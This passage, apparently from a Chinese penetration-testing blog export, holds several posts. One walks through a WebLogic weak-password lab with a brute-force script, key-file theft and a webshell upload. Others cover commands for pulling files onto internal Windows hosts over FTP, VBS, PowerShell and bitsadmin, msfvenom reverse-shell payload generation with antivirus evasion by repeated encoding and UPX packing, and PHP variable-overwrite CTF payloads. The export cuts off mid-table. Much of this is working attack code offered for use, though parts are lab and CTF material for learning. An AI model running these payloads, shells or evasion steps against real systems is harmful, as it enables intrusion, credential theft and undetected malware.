<h2 id="判断目标是否使用了CDN"><a href="#判断目标是否使用了CDN" class="headerlink" title="判断目标是否使用了CDN"></a>判断目标是否使用了CDN</h2><p>通常会通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了CDN。</p>
<p><img src="/posts/25470/5.png" alt></p>
<p>还可以利用在线网站17CE(<a href="https://www.17ce.com)进行全国多地区的ping服务器，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果一样，极有可能不存在CDN；如果IP大多不太一样活规律性很强，可以尝试查询这些ip的归属地，判断是否存在CDN。" target="_blank" rel="noopener">https://www.17ce.com)进行全国多地区的ping服务器，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果一样，极有可能不存在CDN；如果IP大多不太一样活规律性很强，可以尝试查询这些ip的归属地，判断是否存在CDN。</a></p>
<h2 id="绕过CDN寻找真实IP"><a href="#绕过CDN寻找真实IP" class="headerlink" title="绕过CDN寻找真实IP"></a>绕过CDN寻找真实IP</h2><ul>
<li>内部邮箱源</li>
<li>扫描网站测试文件</li>
<li>分站域名</li>
<li>国外访问</li>
<li>查询域名解析记录</li>
<li>如果目标网站有自己的APP，尝试抓取APP的请求</li>
<li>绕过CloudFlare CDN查找真实IP</li>
</ul>
<h2 id="验证获取的IP"><a href="#验证获取的IP" class="headerlink" title="验证获取的IP"></a>验证获取的IP</h2><p>找到真实IP以后，如何验证其真实性呢？ 如果是web，直接用IP访问，看看相应页面是不是和访问域名返回的一样；或者在目标段较大的情况下，借助类似Masscan的工具批量扫描对于IP中所有开了80、443、8080端口的IP，逐个尝试IP访问。</p>
<h1 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h1><p>探测web目录结构和隐藏的敏感文件，从中获取网站的后台管理页面、文件上传页面，甚至网站的源代码。</p>
<p>扫描工具主要有：DirBuster、御剑、wwwcan、dirmap等。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic复现之weak_password</title>
    <url>/posts/39385.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次复现漏洞，从网上找了很多资料，基于vulhub中的weblogic的weak_password漏洞。这次顺便把漏洞复现的过程也写一下。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Docker安装-Ubuntu-16-04"><a href="#Docker安装-Ubuntu-16-04" class="headerlink" title="Docker安装(Ubuntu 16.04)"></a>Docker安装(Ubuntu 16.04)</h3><h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
<li><p>进入weblogic中的weak_password环境目录</p>
<p><code>cd vulhub-master/weblogic/weak_password</code></p>
</li>
<li><p>构建服务</p>
<p><code>sudo docker-compose build</code></p>
</li>
<li><p>启动环境</p>
<p><code>sudo docker-compose up -d</code></p>
</li>
<li><p>进入网址，查看是否部署成功</p>
<p><code>http://your-ip:7001/console</code></p>
</li>
<li><p>本环境弱口令账号密码为</p>
<ul>
<li>账号： weblogic</li>
<li>密码： Oracle@123</li>
</ul>
</li>
</ul>
<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><h3 id="Weblogic常见弱口令总结"><a href="#Weblogic常见弱口令总结" class="headerlink" title="Weblogic常见弱口令总结"></a>Weblogic常见弱口令总结</h3><ul>
<li>system:password        </li>
<li>weblogic:weblogic        </li>
<li>admin:secruity</li>
<li>joe:password        </li>
<li>mary:password        </li>
<li>system:sercurity</li>
<li>wlcsystem:wlcsystem        </li>
<li>weblogic:Oracle@123</li>
</ul>
<h3 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h3><ol>
<li><p>访问后台登录地址，输入任意账号密码，Burpsuite抓包</p>
<p> <img src="/posts/39385/1.jpg" alt></p>
</li>
<li><p>点击右键，将其转发到Intruder模块下,设置数据</p>
<p> <img src="/posts/39385/2.png" alt></p>
<p> <img src="/posts/39385/3.png" alt="账号设置"></p>
<p> <img src="/posts/39385/4.png" alt="密码设置"></p>
</li>
<li><p>开始爆破</p>
<p> <img src="/posts/39385/5.png" alt></p>
</li>
</ol>
<h3 id="Python脚本爆破"><a href="#Python脚本爆破" class="headerlink" title="Python脚本爆破"></a>Python脚本爆破</h3><p>Python小脚本的暴力破解思路和前面BurpSuite下的Intruder下的破解思路是一样的，换汤不换药。</p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def weakPasswd():</span><br><span class="line"></span><br><span class="line">        pwddict &#x3D; [&#39;WebLogic&#39;, &#39;weblogic&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;, &#39;security&#39;, &#39;joe&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data &#x3D; &#123;</span><br><span class="line">                    &#39;j_username&#39;:user,</span><br><span class="line">                    &#39;j_password&#39;:pwd,</span><br><span class="line">                    &#39;j_character_encoding&#39;:&#39;UTF-8&#39;</span><br><span class="line">                &#125;</span><br><span class="line">                #这个位置设置目标地址</span><br><span class="line">                req &#x3D; requests.post(&#39;http:&#x2F;&#x2F;your-ip&#39;+&#39;:7001&#x2F;console&#x2F;j_security_check&#39;, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">                if req.status_code &#x3D;&#x3D; 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text:</span><br><span class="line">                    print(&#39;[+] WebLogic username: &#39;+user+&#39;  password: &#39;+pwd)</span><br><span class="line"></span><br><span class="line">weakPasswd()</span><br></pre></td></tr></table></figure>

<h3 id="配合任意文件下载-读取漏洞来破解密码"><a href="#配合任意文件下载-读取漏洞来破解密码" class="headerlink" title="配合任意文件下载/读取漏洞来破解密码"></a>配合任意文件下载/读取漏洞来破解密码</h3><p>如果没有弱口令漏洞怎么办呢？</p>
<p>刚巧，这个环境下存在一个任意文件下载漏洞。</p>
<p>漏洞地址：</p>
<p><code>http://your-ip:7001/hello/file.jsp?path=</code></p>
<ul>
<li><p>读取后台用户密文与密钥文件</p>
<p>  Weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。</p>
<p>  这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml文件中。</p>
<p>  Burpsuite抓包，在路径path后面输入，./security/SerializedSystemIni.dat 路径，成功拦截到包，将其转发到Repeater模块下，点击Go按钮，来读取加密密钥，返回包是一串数据，如图：</p>
<p>  <img src="/posts/39385/6.png" alt></p>
<p>  现在我们将这串数据保存在本地，选中数据，点击鼠标右键，点击copy to file，选择保存路径（记住这个路径），点击保存，如图：</p>
<p>  <img src="/posts/39385/7.png" alt></p>
<p>  此时，加密密钥我们已经保存下来了，接下来，要寻找加密的密码了，它在 ./config/config.xml文件下的<node-manager-password-encrypted> 标签下，如图：</node-manager-password-encrypted></p>
<p>  <img src="/posts/39385/8.png" alt></p>
</li>
</ul>
<ul>
<li><p>使用工具对后台密码进行破解</p>
<p>  现在，我们打开破解工具，具体位置上面已说到，文件处即为我们刚才保存的文件，密文即为./config/config.xml文件下的<node-manager-password-encrypted> 标签中的内容，全部输入完成后，点击确定，开始破解。</node-manager-password-encrypted></p>
<p>  <img src="/posts/39385/9.png" alt></p>
</li>
</ul>
<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><ol>
<li><p>制作war包</p>
<p>将webshell压缩成zip格式，修改后缀名为war即可</p>
</li>
<li><p>上传war包</p>
<p>点击“部署”，“安装”</p>
<p><img src="/posts/39385/10.png" alt></p>
<p>上载文件</p>
<p><img src="/posts/39385/11.png" alt></p>
<p>选择文件，下一步</p>
<p><img src="/posts/39385/12.png" alt></p>
<p>下一步，“将此部署安装为应用程序”</p>
<p>命名</p>
<p><img src="/posts/39385/13.png" alt></p>
<p>下一步，完成，保存</p>
</li>
<li><p>get shell</p>
<p><img src="/posts/39385/14.png" alt></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>内网文件下载传输</title>
    <url>/posts/31532.html</url>
    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
<p><img src="/posts/31532/1.png" alt></p>
<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Set xPost&#x3D;createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet&#x3D;createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode&#x3D;3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type&#x3D;1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure>
<p>这样会在当前目录生成test.vbs<br>然后执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
<p><img src="/posts/31532/2.png" alt></p>
<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
<p>test.ps1内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$d &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure>
<p><img src="/posts/31532/3.png" alt></p>
<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
<p>第二种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
<p>第三种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
<p>第四种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer aa http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
<p>第五种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info aa &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete aa</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>利用msfvenom生成木马</title>
    <url>/posts/2084.html</url>
    <content><![CDATA[<h2 id="0x00-msfvenom简介"><a href="#0x00-msfvenom简介" class="headerlink" title="0x00 msfvenom简介"></a>0x00 msfvenom简介</h2><p><img src="/posts/2084/1" alt="image-20200505211453615"></p>
<p>中文版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options：</span><br><span class="line">-p,  --payload    &lt;payload&gt;       指定需要使用的 payload （攻击荷载）。如果需要使用自定义的payload，请使用 &amp;#039；-&amp;#039；或者 stdin 指定</span><br><span class="line">-l,  --list       [module_type]        列出指定模块的所有可用资源，模块类型包括：payload、encoders、nops、all</span><br><span class="line">-n,  --nopsled    &lt;length&gt;         为payload预先指定一个NOP滑动长度</span><br><span class="line">-f,  --format     &lt;format&gt;          指定输入格式（使用 --help-formats 来获取msf支持的输出格式列表）</span><br><span class="line">-e,  --encoder    [encoder]        指定需要使用的encoder（编码器）</span><br><span class="line">-a,  --arch       &lt;architecture&gt;   指定payload的目标架构，这里是x86是32位，x64是64位</span><br><span class="line">-platform         &lt;platform&gt;       指定payload的目标平台</span><br><span class="line">-s,  --space      &lt;length&gt;           设定有效攻击荷载的最大长度</span><br><span class="line">-b,  --bad-chars  &lt;list&gt;             设定规避字符集，比如：&amp;#039\x00\xff&amp;#039</span><br><span class="line">-i,  --iterations &lt;count&gt;            指定payload的编码次数</span><br><span class="line">-c,  --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x,  --template   &lt;path&gt;           指定一个自定义的可执行文件作为模板</span><br><span class="line">-k,  --keep                                 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">--payload-options                    列举payload的标准选项</span><br><span class="line">-o,  --out        &lt;path&gt;              保存payload</span><br><span class="line">-v,  --var-name   &lt;name&gt;        指定一个自定义的变量，以确定输出格式</span><br><span class="line">--shellest                                  最小化生成的payload</span><br><span class="line">-h,  --help                                查看帮助选项</span><br><span class="line">--help-formats                        查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

<h2 id="0x01-常用命令"><a href="#0x01-常用命令" class="headerlink" title="0x01 常用命令"></a>0x01 常用命令</h2><p><strong>反弹shell命令</strong></p>
<p><strong>Linux</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p><strong>Windows</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p><strong>PHP</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<p><strong>ASP</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<p><strong>JSP</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<p><strong>Python</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p><strong>Bash</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<p><strong>Perl</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>


<p>以上是基本的生成后门木马，只要想方设法放到目标机器上，并运行。在本地监听端口即可，但是你需要有一个公网的IP。</p>
<h2 id="0x02-免杀"><a href="#0x02-免杀" class="headerlink" title="0x02 免杀"></a>0x02 免杀</h2><p>① 可以尝试多重编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;Your IP Address&gt; lport&#x3D;&lt;Your Port to Connect On&gt; -e x86&#x2F;shikata_ga_nai -i 20 -f raw | msfvenom -e x86&#x2F;alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86&#x2F;shikata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86&#x2F;countdown -a x86 --platform windows -i 10 -x calc.exe -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>② 对上述生成的木马进行upx加壳</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upx shell.exe</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>变量覆盖</title>
    <url>/posts/31081.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值。</p>
<p>变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的有：extract(),parse_str()和import_request_variables()函数,以及”$$”。</p>
<h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><p>$$这种写法称为可变变量<br>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a &#x3D; b;</span><br><span class="line">	$b &#x3D; 2;</span><br><span class="line">	echo $$a;   &#x2F;&#x2F; 2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   include “flag.php”;</span><br><span class="line"></span><br><span class="line">   $_403 &#x3D; “Access Denied”;</span><br><span class="line"></span><br><span class="line">   $_200 &#x3D; “Welcome Admin”;</span><br><span class="line"></span><br><span class="line">   if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; “POST”)</span><br><span class="line">   &#123;</span><br><span class="line">         die(“BugsBunnyCTF is here :p…”);</span><br><span class="line">   &#125;</span><br><span class="line">   if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">   &#123;</span><br><span class="line">         die($_403);</span><br><span class="line">   &#125;</span><br><span class="line">   foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">   &#123;</span><br><span class="line">         $$key &#x3D; $$value;</span><br><span class="line">   &#125;</span><br><span class="line">   foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">   &#123;</span><br><span class="line">         $$key &#x3D; $value;</span><br><span class="line">   &#125;</span><br><span class="line">   if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">   &#123;</span><br><span class="line">         die($_403);</span><br><span class="line">   &#125;</span><br><span class="line">   echo “This is your flag : “. $flag . “\n”;</span><br><span class="line">   die($_200);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>$_SERVER[‘REQUEST_METHOD’]为访问页面时的请求方法<br>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。<br>有两种语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach (array_expression as $value)  &#x2F;&#x2F; 遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key &#x3D;&gt; $value)  &#x2F;&#x2F; 第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>
<p>源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了$$.两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 </p>
<p>但是由于第7，11-14行间的代码会将flag的值给覆盖掉了，所以需要先将flag的值赋给_200或_403变量，然后利用die(_200)或die(_403)将flag打印出来。</p>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>由于第7，11-14行间的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将$flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。</p>
<h2 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h2><pre><code>extract(array,extract_rules,prefix)</code></pre><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">array</td>
<td align="center">必需。规定要使用的数组。</td>
</tr>
<tr>
<td align="center">extract_rules</td>
<td align="center">可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td>
</tr>
<tr>
<td align="center">prefix</td>
<td align="center">可选。请注意 prefix 仅在 extract_type 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; “POST”) </span><br><span class="line">   &#123;</span><br><span class="line">        extract($_POST);</span><br><span class="line">    </span><br><span class="line">        if ($pass &#x3D;&#x3D; $thepassword_123) </span><br><span class="line">       &#123; </span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;”alert alert-success”&gt;</span><br><span class="line"></span><br><span class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt;</span><br><span class="line"></span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目要求使用POST提交数据，extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖$pass和$thepassword_123变量的值，从而满足pass==thepassword_123这个条件。</p>
<h3 id="解题方法-1"><a href="#解题方法-1" class="headerlink" title="解题方法"></a>解题方法</h3><p>使用POST请求提交pass=1&amp;thepassword_123=1, 然后extract()会将接收到的数据将$pass和$thepassword_123变量的值覆盖为空，便满足条件了。<br>PAYLOAD：pass=1&amp;thepassword_123=1<br><img src="https://i.imgur.com/jw5M7z2.png" alt></p>
<h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h2><pre><code>void parse_str ( string $encoded_string [, array &amp;$arr ] )</code></pre><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">encoded_string</td>
<td align="center">必需。规定要解析的字符串。</td>
</tr>
<tr>
<td align="center">arr</td>
<td align="center">可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。</td>
</tr>
<tr>
<td align="center"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$name&#x3D;php;</span><br><span class="line">	$age&#x3D;100;</span><br><span class="line">	parse_str(&quot;name&#x3D;Bill&amp;age&#x3D;60&quot;,$aa);</span><br><span class="line">	print_r($name);    &#x2F;&#x2F; php</span><br><span class="line">	print_r($age);     &#x2F;&#x2F; 100</span><br><span class="line">	print_r($aa[name]);      &#x2F;&#x2F; Bill</span><br><span class="line">	print_r($aa[age]);       &#x2F;&#x2F; 60</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></td>
<td align="center"></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if (empty($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    	show_source(__FILE__);</span><br><span class="line">    	die();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">    	include(&#39;flag.php&#39;);</span><br><span class="line">		$a &#x3D; &quot;www.OPENCTF.com&quot;;</span><br><span class="line">		$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">		@parse_str($id);</span><br><span class="line">		if ($a[0] !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)) &#123;</span><br><span class="line">    		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		exit(&#39;其实很简单其实并不难！&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先要求使用GET提交id参数，然后parse_str($id)对id参数的数据进行处理，再使用判断a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391。</p>
<h3 id="解题方法-2"><a href="#解题方法-2" class="headerlink" title="解题方法"></a>解题方法</h3><p>使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得到flag。</p>
<h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><pre><code>bool import_request_variables ( string $types [, string $prefix ] )</code></pre><p>将 GET／POST／Cookie 变量导入到全局作用域中。</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">types</td>
<td align="center">指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。</td>
</tr>
<tr>
<td align="center">prefix</td>
<td align="center">为变量名的前缀，置于所有被导入到全局作用域的变量之前。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。</td>
</tr>
<tr>
